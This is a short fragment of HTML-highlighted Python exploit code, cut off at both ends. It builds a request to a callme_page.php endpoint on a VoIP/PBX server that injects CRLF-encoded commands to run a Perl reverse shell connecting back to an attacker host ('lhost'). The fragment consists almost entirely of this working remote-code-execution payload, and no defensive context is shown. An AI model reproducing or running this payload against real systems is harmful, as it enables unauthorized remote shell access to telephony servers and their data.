</span> 
<span class="c1"># Reverse shell payload
</span> 
<span class="n">url</span> <span class="o">=</span> <span class="s">'https://'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">rhost</span><span class="p">)</span><span class="o">+</span><span class="s">'/recordings/misc/callme_page.php?action=c&amp;callmenum='</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">extension</span><span class="p">)</span><span class="o">+</span><span class="s">'@from-internal/n</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">AApplication:</span><span class="si">%20</span><span class="s">system</span><span class="si">%0</span><span class="s">D</span><span class="si">%0</span><span class="s">AData:</span><span class="si">%20</span><span class="s">perl</span><span class="si">%20</span><span class="s">-MIO</span><span class="si">%20</span><span class="s">-e</span><span class="si">%20%27%24</span><span class="s">p</span><span class="si">%3</span><span class="s">dfork</span><span class="si">%3</span><span class="s">bexit</span><span class="si">%2</span><span class="s">cif</span><span class="si">%28%24</span><span class="s">p</span><span class="si">%29%3</span><span class="s">b</span><span class="si">%24</span><span class="s">c</span><span class="si">%3</span><span class="s">dnew</span><span class="si">%20</span><span class="s">IO</span><span class="si">%3</span><span class="s">a</span><span class="si">%3</span><span class="s">aSocket</span><span class="si">%3</span><span class="s">a</span><span class="si">%3</span><span class="s">aINET</span><span class="si">%28</span><span class="s">PeerAddr</span><span class="si">%2</span><span class="s">c</span><span class="si">%22</span><span class="s">'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">lhost</span><span class="p">)</span><span class="o">+</span><span class="s">'</span><span class="si">%3</span><span